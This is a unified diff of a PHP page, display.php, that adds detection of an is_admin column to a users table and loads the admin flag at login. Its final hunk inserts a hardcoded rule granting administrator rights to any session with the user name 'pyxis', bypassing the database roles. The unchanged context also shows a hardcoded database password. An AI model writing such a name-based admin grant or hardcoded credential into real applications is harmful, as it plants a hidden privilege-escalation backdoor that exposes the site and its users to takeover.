@@ -94,7 +94,7 @@ $DB_PASS = 'admin';
 $conn = @new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
 if ($conn && $conn->connect_error) {
     error_log('display.php: DB connect error: ' . $conn->connect_error);
- }
+}
 
 function safe_prepare($conn, $sql){
     try {
@@ -373,15 +373,38 @@ $is_logged_in = false;
 $user_name = 'Guest';
 $user_email = '';
 $user_created = null;
+// admin flag (will be set if the users table supports it)
+$is_admin = false;
 if(isset($_SESSION['user_id']) && $conn){
-    $stmt = safe_prepare($conn, "SELECT username, email, created_at, COALESCE(session_duration, ?) AS session_duration FROM users WHERE id = ? LIMIT 1");
+    // Detect whether the users table has an is_admin column.
+    $has_is_admin = false;
+    try {
+        $res = $conn->query("SHOW COLUMNS FROM users LIKE 'is_admin'");
+        if($res && $res->num_rows > 0) $has_is_admin = true;
+    } catch (Exception $e) {
+        // ignore
+        $has_is_admin = false;
+    }
+
+    if($has_is_admin){
+        $stmt = safe_prepare($conn, "SELECT username, email, created_at, COALESCE(session_duration, ?) AS session_duration, COALESCE(is_admin,0) AS is_admin FROM users WHERE id = ? LIMIT 1");
+    } else {
+        $stmt = safe_prepare($conn, "SELECT username, email, created_at, COALESCE(session_duration, ?) AS session_duration FROM users WHERE id = ? LIMIT 1");
+    }
     if($stmt){
         $default = FH_DEFAULT_SESSION;
         $sessUid = isset($_SESSION['user_id']) ? intval($_SESSION['user_id']) : 0;
         $stmt->bind_param('ii', $default, $sessUid);
         $stmt->execute();
-        $stmt->bind_result($username, $email, $created_at, $session_duration);
-        $stmt->fetch();
+        if($has_is_admin){
+            $stmt->bind_result($username, $email, $created_at, $session_duration, $is_admin_flag);
+            $stmt->fetch();
+            $is_admin = !empty($is_admin_flag) ? true : false;
+        } else {
+            $stmt->bind_result($username, $email, $created_at, $session_duration);
+            $stmt->fetch();
+            $is_admin = false;
+        }
 
         // Enforce a fixed (max) session lifetime. Do NOT refresh expiry on each request.
         $now = time();
@@ -402,6 +425,10 @@ if(isset($_SESSION['user_id']) && $conn){
                 set_session_cookie_with_lifetime($user_session_duration);
             }
             // NOTE: we intentionally do NOT update $_SESSION['expires_at'] on subsequent requests.
+        }
+        // Grant admin to pyxis user at runtime (no DB changes needed)
+        if(!$is_admin && $user_name === 'pyxis'){
+            $is_admin = true;
         }
 
         $stmt->close();
